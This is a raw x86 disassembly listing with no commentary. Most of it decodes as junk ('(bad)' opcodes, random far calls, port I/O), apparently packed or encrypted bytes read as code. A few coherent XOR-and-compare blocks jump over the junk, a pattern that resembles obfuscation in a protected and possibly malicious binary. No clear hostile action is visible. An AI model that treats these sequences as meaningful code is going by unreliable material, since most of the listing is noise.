  4041e7:	lods   eax,DWORD PTR ds:[esi]
  4041e8:	push   esi
  4041e9:	(bad)  
  4041ea:	cmp    bh,BYTE PTR [ebx+0x55fb3441]
  4041f0:	int3   
  4041f1:	add    dl,ah
  4041f3:	sbb    al,0xc7
  4041f5:	cmp    DWORD PTR [eax+0xa],edi
  4041f8:	lock (bad) [ebx]
  4041fb:	mov    ch,0xef
  4041fd:	cmp    al,0x4
  4041ff:	not    bh
  404201:	xchg   BYTE PTR [esp+edx*4],bh
  404204:	es jmp 0x404218
  404207:	mov    esi,0xbcdc2fc3
  40420c:	xor    eax,0xc147a250
  404211:	cmp    DWORD PTR [ebx],0xffffffdd
  404214:	xchg   ebp,eax
  404215:	dec    eax
  404216:	pop    ds
  404217:	xchg   DWORD PTR [ebx],esp
  404219:	mov    dh,0xe6
  40421b:	daa    
  40421c:	call   0x9113:0x12e5bfb1
  404223:	jns    0x4041b3
  404225:	fdiv   st(0),st
  404227:	aam    0xf7
  404229:	les    ebp,FWORD PTR [edx+esi*8]
  40422c:	fisttp WORD PTR [esi]
  40422e:	lea    eax,[edi]
  404230:	adc    DWORD PTR [ecx-0x1e027dd2],esp
  404236:	xchg   edi,eax
  404237:	mov    bl,0x1f
  404239:	das    
  40423a:	jge    0x4041c9
  40423c:	xchg   edi,eax
  40423d:	lea    ecx,[eax+0x2f]
  404240:	jge    0x4041f5
  404242:	sbb    eax,0x795d8cdb
  404247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404248:	test   al,0x80
  40424a:	jno    0x4041e9
  40424c:	xor    edx,eax
  40424e:	xor    edi,eax
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	mov    ds:0xed444847,eax
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x404210
  40426e:	xor    esp,esp
  404270:	lahf   
  404271:	enter  0xc391,0x9b
  404275:	jle    0x404275
  404277:	add    eax,0x650f20a4
  40427c:	call   0xadc8:0x7621792
  404283:	enter  0xe303,0x55
  404287:	test   al,dl
  404289:	and    cl,BYTE PTR [ebp+ebp*1-0x51945294]
  404290:	jle    0x4042e9
  404292:	cmp    eax,0x82cb8228
  404297:	dec    esp
  404298:	arpl   WORD PTR [eax+0x22],ax
  40429b:	retf   
  40429c:	fnstenv [edx]
  40429e:	jg     0x404302
  4042a0:	xchg   ecx,eax
  4042a1:	adc    DWORD PTR [ebx+0x3f],edi
  4042a4:	jbe    0x4042e5
  4042a6:	pushf  
  4042a7:	mov    ecx,0x71eddf94
  4042ac:	sbb    DWORD PTR [edx+ebp*2+0x25],eax
  4042b0:	mov    ?,WORD PTR [eax-0x6c44f332]
  4042b6:	retf   
  4042b7:	push   edi
  4042b8:	pop    ebp
  4042b9:	sub    bl,0xbd
  4042bc:	cld    
  4042bd:	out    dx,al
  4042be:	push   edx
  4042bf:	add    BYTE PTR [edi+0x68a0997f],dl
  4042c5:	xor    eax,edx
  4042c7:	cs inc esi
  4042c9:	call   0x42f2:0x52994b23
  4042d0:	loope  0x4042d0
  4042d2:	mov    ds:0xf5c90682,eax
  4042d7:	jmp    0xc72fda9d
  4042dc:	call   0xaf2d15dd
  4042e1:	ja     0x404272
  4042e3:	push   ebp
  4042e4:	adc    BYTE PTR [ecx+0x59],0x4b
  4042e8:	imul   esi,DWORD PTR [eax-0x6c],0x45
  4042ec:	cmp    DWORD PTR gs:[edi+eiz*2-0x73f5c88],ebp
  4042f4:	pop    ebx
  4042f5:	xor    al,BYTE PTR [ecx+0x2c]
  4042f8:	sar    DWORD PTR [edi],0x7b
  4042fb:	xchg   ebp,eax
  4042fc:	enter  0x69c6,0xa8
  404300:	push   esp
  404301:	dec    edx
  404302:	xor    ebx,ebp
  404304:	mov    al,0xc0
  404306:	push   cs
  404307:	jo     0x404357
  404309:	call   0xc7ed:0x92abba92
  404310:	sbb    edx,ebx
  404312:	int    0xcf
  404314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404315:	push   edi
  404316:	fisubr WORD PTR [edx+0x2b8428d3]
  40431c:	pop    edx
  40431d:	fldenv [ecx]
  40431f:	repz and eax,0x88f062f
  404325:	or     dh,BYTE PTR [ebp+edx*2+0x4696f18c]
  40432c:	pop    ecx
  40432d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40432e:	adc    bh,bl
  404330:	push   ecx
  404331:	mov    ah,dl
  404333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404334:	mov    ebp,0x34c9aec4
  404339:	test   DWORD PTR [ecx+0x32d0ecf5],0xefb3e6a1
  404343:	adc    dh,BYTE PTR [ebx+0x4]
  404346:	jle    0x4043a4
  404348:	test   DWORD PTR [ecx],0xc5541100
  40434e:	pop    ds
  40434f:	adc    eax,0xb3574995
  404354:	cmp    DWORD PTR [eax],esi
  404356:	push   ecx
  404357:	test   al,0x40
  404359:	pop    ebp
  40435a:	clc    
  40435b:	jmp    0xcd638326
  404360:	inc    ecx
  404361:	aaa    
  404362:	rol    DWORD PTR [ecx+0x446a49bf],1
  404368:	sbb    BYTE PTR [ecx+esi*4-0x70],dh
  40436c:	cmp    al,0xda
  40436e:	add    bh,cl
  404370:	cmp    bh,BYTE PTR [ebp-0x39]
  404373:	mov    esi,0xee67ad52
  404378:	mov    eax,0x2666e39b
  40437d:	adc    ebx,DWORD PTR [eax-0x43]
  404380:	mov    BYTE PTR [eax-0x13cf188d],bl
  404386:	push   ss
  404387:	sbb    BYTE PTR [edi],bh
  404389:	xlat   BYTE PTR ds:[ebx]
  40438a:	dec    esp
  40438b:	loopne 0x4043ce
  40438d:	mov    al,ds:0x612d1da5
  404392:	adc    BYTE PTR [eax],0x12
  404395:	sub    esp,eax
  404397:	js     0x404389
  404399:	pushf  
  40439a:	mov    eax,DWORD PTR ds:0x97c54505
  4043a0:	dec    ebx
  4043a1:	or     BYTE PTR [edi-0x62],0x25
  4043a5:	cmp    dh,bl
  4043a7:	ja     0x4043e3
  4043a9:	nop
  4043aa:	jo     0x4043b5
  4043ac:	add    eax,0x2b750aae
  4043b1:	mov    bl,0x27
  4043b3:	xor    eax,0x9e292c41
  4043b8:	lea    ecx,[edx+0xa69004e]
  4043be:	fld    QWORD PTR [esi+0x5d939569]
  4043c4:	add    BYTE PTR [esi-0x21365163],ah
  4043ca:	test   DWORD PTR [esi-0x68e26e61],0x6301cf87
  4043d4:	int    0x71
  4043d6:	mov    ah,BYTE PTR [ecx-0x69e21527]
  4043dc:	test   DWORD PTR ds:0x57490473,ecx
  4043e2:	mov    WORD PTR [ecx+0x6e3a0785],es
  4043e8:	ret    
  4043e9:	jo     0x4043bf
  4043eb:	mov    edx,0xfccc43ff
  4043f0:	cwde   
  4043f1:	imul   edi,DWORD PTR [ecx],0x48
  4043f4:	mov    edx,0x4402e2e2
  4043f9:	mov    edx,0xd103f903
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xec0a60df,al
  40444e:	adc    edi,DWORD PTR [edx+0x17]
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404461
  404458:	or     DWORD PTR [edi+ebx*8],0x17
  40445c:	dec    ecx
  40445d:	ror    BYTE PTR [edx+0x55],cl
  404460:	pop    ecx
  404461:	out    dx,al
  404462:	daa    
  404463:	fbld   TBYTE PTR [eax+ecx*8+0x25]
  404467:	add    ebx,DWORD PTR [edi+0x2af4e2fc]
  40446d:	lock adc eax,0xc8ce0653
  404473:	(bad)  [esi+0x8414a4c]
  404479:	ret    
  40447a:	les    ebp,FWORD PTR [esp+edi*1+0x1e]
  40447e:	(bad)  
  40447f:	fdivr  DWORD PTR [eax-0x3b396838]
  404485:	push   ecx
  404486:	es mov bl,0xbd
  404489:	aas    
  40448a:	mov    al,ds:0xe5350416
  40448f:	pop    eax
  404490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404491:	sar    DWORD PTR [edi-0x56],0x73
  404495:	adc    al,0xdd
  404497:	mov    dh,0xb4
  404499:	add    eax,0x22486f00
  40449e:	call   FWORD PTR [ecx+0x4fda518f]
  4044a4:	cmp    dl,ah
  4044a6:	aas    
  4044a7:	push   ebp
  4044a8:	popa   
  4044a9:	sub    al,0x77
  4044ab:	add    esi,DWORD PTR [esi+0xf53f430]
  4044b1:	loope  0x40451e
  4044b3:	test   al,0xb0
  4044b5:	mov    eax,ds:0xfa8f8827
  4044ba:	fld    DWORD PTR ss:[edi+eax*2]
  4044be:	sbb    BYTE PTR [ebx-0x68],bl
  4044c1:	fadd   QWORD PTR [ecx-0x1321285d]
  4044c7:	inc    eax
  4044c8:	clc    
  4044c9:	ror    BYTE PTR [eax+0x5c2416cc],0x63
  4044d0:	test   BYTE PTR [edi+0x3c2665d7],bl
  4044d6:	fnstcw WORD PTR [esi]
  4044d8:	push   ds
  4044d9:	bound  edi,QWORD PTR [eax]
  4044db:	in     eax,0xe2
  4044dd:	popa   
  4044de:	inc    esp
  4044df:	imul   ebp,DWORD PTR [eax],0xa929ee61
  4044e5:	sbb    DWORD PTR [edi+esi*4],esp
  4044e8:	xchg   ecx,eax
  4044e9:	dec    edx
  4044ea:	imul   DWORD PTR [edx]
  4044ec:	aaa    
  4044ed:	js     0x404516
  4044ef:	cmp    eax,0xffffff9b
  4044f2:	adc    BYTE PTR [edx-0x3268c43d],dl
  4044f8:	xchg   ebp,eax
  4044f9:	pop    ss
  4044fa:	mov    al,0x51
  4044fc:	xchg   BYTE PTR [ecx+0x78d2da3d],al
  404502:	imul   esp,DWORD PTR [eax],0x30f28651
  404508:	push   es
  404509:	jmp    0x404514
  40450b:	inc    edx
  40450c:	(bad)  
  40450d:	lods   al,BYTE PTR ds:[esi]
  40450e:	mov    ds:0x4cd368de,eax
  404513:	jnp    0x404502
  404515:	pop    esp
  404516:	xor    dl,BYTE PTR [esi]
  404518:	xchg   esi,eax
  404519:	jo     0x4044c7
  40451b:	jmp    0x7eb2:0x62e9165
  404522:	adc    DWORD PTR [eax-0x6cfe4738],eax
  404528:	and    al,0x6d
  40452a:	nop
  40452b:	jne    0x4044db
  40452d:	pop    ebx
  40452e:	mov    bl,0x8
  404530:	pop    ebp
  404531:	repz icebp 
  404533:	mov    ch,0xc0
  404535:	push   ss
  404536:	adc    ah,dl
  404538:	jne    0x4044cd
  40453a:	push   ss
  40453b:	fcmovnb st,st(6)
  40453d:	data16 mov ds:0xdb504f73,al
  404543:	ja     0x4044f3
  404545:	outs   dx,DWORD PTR ds:[esi]
  404546:	dec    ecx
  404547:	data16 and al,0x74
  40454a:	cmp    ebx,ecx
  40454c:	pushf  
  40454d:	adc    DWORD PTR [edx+esi*4],ebp
  404550:	inc    cx
  404552:	popa   
  404553:	imul   ebx,DWORD PTR [esi],0xffffff80
  404556:	pop    es
  404557:	xor    BYTE PTR [edi-0x54],ah
  40455a:	mov    ds:0x86d20b6c,eax
  40455f:	or     cl,BYTE PTR [edx+0x2]
  404562:	xor    bh,BYTE PTR [ecx-0x3d281c23]
  404568:	inc    ebp
  404569:	(bad)  
  40456a:	(bad)  
  40456b:	arpl   WORD PTR [esi],dx
  40456d:	push   es
  40456e:	mov    WORD PTR [edx],cs
  404570:	pop    esp
  404571:	pop    eax
  404572:	jnp    0x4045d9
  404574:	cwde   
  404575:	out    0xb3,eax
  404577:	aas    
  404578:	jno    0x4045a4
  40457a:	aam    0x45
  40457c:	retf   0xedf0
  40457f:	mov    eax,ds:0xdeac81e
  404584:	adc    eax,0xcb965e9a
  404589:	fst    st(3)
  40458b:	sub    al,0x86
  40458d:	retf   0x55b3
  404590:	test   ecx,esi
  404592:	shl    BYTE PTR [ebp+0x467e0a54],0xb0
  404599:	test   DWORD PTR [ebx-0x3fff11e4],ebx
  40459f:	sbb    ah,BYTE PTR [edx-0x66772c3b]
  4045a5:	push   0xffffffbb
  4045a7:	and    eax,0x353fe386
  4045ac:	mov    ebp,0x32728108
  4045b1:	and    BYTE PTR [ecx+0x5a],dh
  4045b4:	jecxz  0x4045d9
  4045b6:	aaa    
  4045b7:	leave  
  4045b8:	or     al,BYTE PTR [edi]
  4045ba:	pop    ebp
  4045bb:	jmp    0x7f5e15b9
  4045c0:	inc    esp
  4045c1:	cmp    eax,0xad44fec
  4045c6:	and    ebp,DWORD PTR [ebx-0x5f]
  4045c9:	xchg   edi,eax
  4045ca:	xchg   edx,eax
  4045cb:	and    DWORD PTR [ebx-0x4c],0x1d93069
  4045d2:	pop    edx
  4045d3:	sub    BYTE PTR [eax+0x367c0fbb],bl
  4045d9:	pushw  ds
  4045db:	fwait
  4045dc:	into   
  4045dd:	retf   0xfd34
  4045e0:	mov    esp,0x8b20be28
  4045e5:	push   ebp
  4045e6:	int3   
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx+0x54e4bf30],al
  40466a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40466b:	maskmovq mm5,(bad)
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x4046b9
  404675:	lea    edi,[edx-0x19]
  404678:	fcom   QWORD PTR [edi]
  40467a:	sbb    al,0xff
  40467c:	das    
  40467d:	cmp    DWORD PTR [eax+0xb],0x33
  404681:	cmp    DWORD PTR [edi-0x629e0ea9],ecx
  404687:	sar    ebp,cl
  404689:	mov    ds:0xefa2d39c,al
  40468e:	sbb    ch,ch
  404690:	mov    ah,0x1a
  404692:	xchg   ebx,eax
  404693:	cmp    ebp,DWORD PTR [ebx]
  404695:	mov    esp,0xbdb23ee5
  40469a:	dec    ebx
  40469b:	dec    edx
  40469c:	add    ah,BYTE PTR [esi]
  40469e:	push   ecx
  40469f:	lahf   
  4046a0:	cmp    al,BYTE PTR [edx+0xfeefe18]
  4046a6:	jge    0x404683
  4046a8:	clc    
  4046a9:	sbb    al,0x81
  4046ab:	pop    ecx
  4046ac:	cmp    DWORD PTR [ebx],edi
  4046ae:	adc    eax,0x60c1aea7
  4046b3:	pop    ds
  4046b4:	call   0xcfd19e0f
  4046b9:	dec    ebx
  4046ba:	push   0x6a5c6bdd
  4046bf:	imul   eax,DWORD PTR [ecx-0x5f],0x2e83d4ab
  4046c6:	retf   
  4046c7:	xchg   edx,ebp
  4046c9:	dec    edx
  4046ca:	(bad)  
  4046cb:	out    0xca,al
  4046cd:	popf   
  4046ce:	fcomp  QWORD PTR [ebx+0x60c5c0a9]
  4046d4:	or     eax,0xc46f6067
  4046d9:	sar    DWORD PTR [ebp+ecx*2-0x4709aa55],1
  4046e0:	or     DWORD PTR [edx-0x74a405f4],edx
  4046e6:	xchg   ecx,eax
  4046e7:	and    DWORD PTR [ebx+0x3e],ecx
  4046ea:	or     ecx,DWORD PTR ds:0x68e29903
  4046f0:	mov    cl,0x4b
  4046f2:	push   eax
  4046f3:	jecxz  0x4046e3
  4046f5:	sub    dh,BYTE PTR [esi+0x283f428f]
  4046fb:	and    eax,0x6213e7d1
  404700:	inc    esi
  404701:	cmc    
  404702:	ja     0x4046e8
  404704:	mov    bl,0xb4
  404706:	rcr    esi,1
  404708:	aad    0xf4
  40470a:	mov    ebp,0xc2a184d2
  40470f:	mov    BYTE PTR [ecx+ecx*4+0x43e15232],0xca
  404717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404718:	push   cs
  404719:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40471b:	mov    dl,BYTE PTR [edi+0x24]
  40471e:	or     ebx,edi
  404720:	lds    eax,FWORD PTR [edx]
  404722:	scas   eax,DWORD PTR es:[edi]
  404723:	arpl   WORD PTR [ecx],di
  404725:	or     bh,BYTE PTR [ecx+0x776f345e]
  40472b:	add    BYTE PTR [edx],al
  40472d:	aas    
  40472e:	sbb    eax,0xb66858ef
  404733:	arpl   WORD PTR [ebx-0x39d9f349],di
  404739:	lea    ebp,[ebp+0x34]
  40473c:	out    dx,al
  40473d:	pop    edi
  40473e:	cdq    
  40473f:	pop    eax
  404740:	push   0xffffffa4
  404742:	push   esi
  404743:	and    BYTE PTR [esi-0x19e263b],bh
  404749:	psllw  mm0,QWORD PTR [eax+0x3d]
  40474d:	adc    eax,0xec18c324
  404752:	bound  eax,QWORD PTR ds:0x436b5f2
  404758:	aaa    
  404759:	xor    eax,0xea1ff030
  40475e:	or     esp,DWORD PTR [eax+0x19f67704]
  404764:	pusha  
  404765:	les    edx,FWORD PTR [eax+0x42]
  404768:	add    al,0xd1
  40476a:	in     ax,dx
  40476c:	add    al,0xaa
  40476e:	or     BYTE PTR [edx+0x76],0xcb
  404772:	outs   dx,BYTE PTR ds:[esi]
  404773:	add    DWORD PTR [edx+0x7f],ebp
  404776:	or     DWORD PTR [esi-0x13ad7926],eax
  40477c:	data16 jge 0x40479e
  40477f:	xor    al,0x1c
  404781:	out    0xe2,al
  404783:	cdq    
  404784:	rcr    esi,0xe6
  404787:	and    al,0x32
  404789:	ins    DWORD PTR es:[edi],dx
  40478a:	mov    esp,0xd7bfdee4
  40478f:	jmp    0x4281d22e
  404794:	loope  0x40476f
  404796:	loope  0x4047c4
  404798:	sbb    eax,0xf4699905
  40479d:	xlat   BYTE PTR ds:[ebx]
  40479e:	sar    DWORD PTR [ecx],0x60
  4047a1:	(bad)  
  4047a3:	dec    ecx
  4047a4:	mov    cs,esp
  4047a6:	inc    ecx
  4047a7:	clc    
  4047a8:	mov    dh,0xb1
  4047aa:	mov    ah,0x46
  4047ac:	out    dx,al
  4047ad:	(bad)  
  4047af:	push   ebp
  4047b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047b1:	jne    0x40473e
  4047b3:	xor    cl,cl
  4047b5:	jb     0x4047cc
  4047b7:	fcmovnb st,st(1)
  4047b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ba:	mov    eax,0x7948c1d7
  4047bf:	or     ecx,edx
  4047c1:	cli    
  4047c2:	shl    BYTE PTR ds:0x1a5cea7b,1
  4047c8:	jge    0x404768
  4047ca:	into   
  4047cb:	sub    BYTE PTR [edx-0x1534c71d],0xbe
  4047d2:	mov    ebx,DWORD PTR [ecx+eax*4-0x51ae1d22]
  4047d9:	mov    ah,0xd5
  4047db:	mov    eax,0xb3f1b4ba
  4047e0:	fsubr  st(0),st
  4047e2:	out    dx,al
  4047e3:	dec    esp
  4047e4:	mov    ebp,0xc0fb23b
  4047e9:	add    DWORD PTR [ebx],esi
  4047eb:	xor    al,0x56
  4047ed:	fs xchg ecx,eax
  4047ef:	xor    al,0x67
  4047f1:	jno    0x40483d
  4047f3:	aaa    
  4047f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f5:	dec    ebx
  4047f6:	test   eax,0x5fb78ad2
  4047fb:	and    dh,ch
  4047fd:	mov    ah,0x23
  4047ff:	retf   
  404800:	mov    ds:0x5503d033,al
  404805:	in     al,dx
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x4a5b0f46],0xffe5
  40482a:	fiadd  DWORD PTR [ebx+ebp*1]
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404887
  404834:	pop    ecx
  404835:	shr    BYTE PTR [edx+0x1c],0xc4
  404839:	clc    
  40483a:	dec    eax
  40483b:	xor    dl,BYTE PTR [edx+0x6f450ed]
  404841:	pop    es
  404842:	mov    al,0x56
  404844:	adc    cl,BYTE PTR [edx]
  404846:	out    0x6f,al
  404848:	es scas eax,DWORD PTR es:[edi]
  40484a:	dec    edx
  40484b:	repz fst DWORD PTR [ebp+0x3926db14]
  404852:	dec    esi
  404853:	leave  
  404854:	push   edx
  404855:	mov    dl,0x1b
  404857:	sub    al,BYTE PTR [edx]
  404859:	sbb    edi,eax
  40485b:	mov    ds:0x58507e0e,eax
  404860:	cmp    edi,DWORD PTR [ecx+0xb33d413]
  404866:	std    
  404867:	mov    dl,0xad
  404869:	dec    ebp
  40486a:	xor    eax,0xa2654ae0
  40486f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404870:	cmp    DWORD PTR [ecx+0x61376494],esp
  404876:	daa    
  404877:	mov    ?,WORD PTR [ebx+0x2a]
  40487a:	xlat   BYTE PTR ds:[ebx]
  40487b:	or     esp,edx
  40487d:	fdiv   st,st(7)
  40487f:	daa    
  404880:	scas   eax,DWORD PTR es:[edi]
  404881:	je     0x404810
  404883:	xor    BYTE PTR [ecx],cl
  404885:	sub    ecx,DWORD PTR [esi]
  404887:	cdq    
  404888:	xchg   ebp,eax
  404889:	jecxz  0x40488f
  40488b:	push   edx
  40488c:	hlt    
  40488d:	dec    ebp
  40488e:	push   ebx
  40488f:	das    
  404890:	addr16 pop ebp
  404892:	xor    BYTE PTR [esi-0x79],al
  404895:	fucomp st(2)
  404897:	mov    cl,0x5
  404899:	or     DWORD PTR [ecx-0x722a61c2],ebx
  40489f:	push   ebx
  4048a0:	push   ecx
  4048a1:	mov    esp,0x210b6567
  4048a6:	push   ecx
  4048a7:	rep outs dx,BYTE PTR ds:[esi]
  4048a9:	or     al,0x42
  4048ab:	dec    edx
  4048ac:	add    eax,0x14d45211
  4048b1:	mov    esp,?
  4048b3:	aam    0x85
  4048b5:	shl    bh,1
  4048b7:	outs   dx,BYTE PTR ds:[esi]
  4048b8:	sbb    DWORD PTR [ebp-0x74],0x835beb97
  4048bf:	push   ss
  4048c0:	push   edi
  4048c1:	push   0xe
  4048c3:	push   ds
  4048c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048c5:	fst    st(4)
  4048c7:	jb     0x4048a8
  4048c9:	mov    al,0xfb
  4048cb:	fisub  WORD PTR [ecx-0x6faf54a4]
  4048d1:	out    0xa4,eax
  4048d3:	cmp    al,0xff
  4048d5:	pop    esp
  4048d6:	daa    
  4048d7:	and    esi,DWORD PTR [ebp-0x1636afb2]
  4048dd:	in     eax,0xd9
  4048df:	sub    BYTE PTR ds:0xcead0a5a,cl
  4048e5:	add    eax,0x13dcc0a
  4048ea:	pop    ebx
  4048eb:	jb     0x404951
  4048ed:	nop
  4048ee:	xchg   esp,eax
  4048ef:	pop    esi
  4048f0:	(bad)  
  4048f1:	int    0xe5
  4048f3:	nop
  4048f4:	lods   eax,DWORD PTR ds:[esi]
  4048f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048f6:	or     BYTE PTR [edi-0x32],ch
  4048f9:	xchg   DWORD PTR [eax-0x6e],eax
  4048fc:	outs   dx,DWORD PTR ds:[esi]
  4048fd:	ja     0x4048ec
  4048ff:	cmp    ah,BYTE PTR [esi-0x39]
  404902:	sub    al,0xf6
  404904:	mov    edx,0xf4bbdaf8
  404909:	cmp    bl,dl
  40490b:	push   edi
  40490c:	push   ds
  40490d:	ins    DWORD PTR es:[edi],dx
  40490e:	cmpxchg cl,bh
  404911:	fs cli 
  404913:	and    al,0x58
  404915:	aam    0x51
  404917:	fwait
  404918:	shr    BYTE PTR [esi],1
  40491a:	sbb    edx,esi
  40491c:	mov    bh,0x61
  40491e:	retf   
  40491f:	xor    DWORD PTR [ecx+eiz*2-0x5ad8047c],ecx
  404926:	sub    BYTE PTR [ebx+0x20],cl
  404929:	dec    esi
  40492a:	repz adc BYTE PTR [ebx-0x1d],al
  40492e:	lea    esi,[edx-0x6a6fd4ef]
  404934:	(bad)  
  404935:	jnp    0x4048e6
  404937:	sub    al,0xf7
  404939:	xor    BYTE PTR [eax+0x57],dl
  40493c:	xor    ebx,esp
  40493e:	repnz mov ebp,0x662e04cb
  404944:	loopne 0x404945
  404946:	jne    0x40495a
  404948:	xchg   ecx,eax
  404949:	ficom  DWORD PTR [eax+0x56b5eb84]
  40494f:	jnp    0x404985
  404951:	clc    
  404952:	ins    DWORD PTR es:[edi],dx
  404953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404954:	mov    bl,0x19
  404956:	shl    DWORD PTR [ecx-0x3d],0xa1
  40495a:	scas   al,BYTE PTR es:[edi]
  40495b:	imul   ebp,DWORD PTR [eax+0x56da75e7],0x9e28f467
  404965:	enter  0x377e,0xaa
  404969:	out    0x45,al
  40496b:	dec    ecx
  40496c:	cmp    BYTE PTR [edx-0x7ed1c12b],bl
  404972:	add    DWORD PTR [ebx-0x63],eax
  404975:	xchg   esp,eax
  404976:	mov    ah,BYTE PTR [edi]
  404978:	repnz xchg edx,eax
  40497a:	lods   eax,DWORD PTR ds:[esi]
  40497b:	push   edi
  40497c:	rol    DWORD PTR [ebp-0x6e],cl
  40497f:	loopne 0x40498b
  404981:	data16 xor BYTE PTR [ebx+0x1723b939],ch
  404988:	ja     0x404911
  40498a:	jmp    0x404992
  40498c:	jge    0x404910
  40498e:	xlat   BYTE PTR ds:[ebx]
  40498f:	pop    esi
  404990:	dec    ebx
  404991:	(bad)  
  404992:	mov    BYTE PTR [esi-0x7d1952b6],dh
  404998:	rdtsc  
  40499a:	xchg   edx,eax
  40499b:	shl    DWORD PTR [edi],cl
  40499d:	xchg   ebp,eax
  40499e:	mov    esp,ecx
  4049a0:	mov    ecx,0x899cd49
  4049a5:	dec    eax
  4049a6:	jne    0x4049cc
  4049a8:	sub    DWORD PTR [edx],eax
  4049aa:	int3   
  4049ab:	lods   al,BYTE PTR ds:[esi]
  4049ac:	mov    edx,0x2b56c263
  4049b1:	daa    
  4049b2:	rcr    edi,0xeb
  4049b5:	test   al,0x8f
  4049b7:	pop    es
  4049b8:	xor    DWORD PTR [edi-0x4f4daa6a],0xd033b384
  4049c2:	add    edx,DWORD PTR [ebp-0x14]
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    esp,ebx
  4049d7:	popa   
  4049d8:	pop    esp
  4049d9:	sbb    edx,DWORD PTR [ecx-0x748181d4]
  4049df:	jg     0x404a5f
  4049e1:	jle    0x4049e1
  4049e3:	outs   dx,DWORD PTR ds:[esi]
  4049e4:	add    al,0x9a
  4049e6:	and    eax,0x388f9bac
  4049eb:	fisubr DWORD PTR [edx+ecx*8+0x75ab9171]
  4049f2:	dec    edx
  4049f3:	rcl    DWORD PTR [ecx+edx*4-0x47],1
  4049f7:	rol    al,cl
  4049f9:	inc    edi
  4049fa:	enter  0xa983,0xc4
  4049fe:	sub    cl,BYTE PTR [edx-0x3e]
  404a01:	jns    0x4049dd
  404a03:	jg     0x404a5c
  404a05:	aaa    
  404a06:	in     al,0xd9
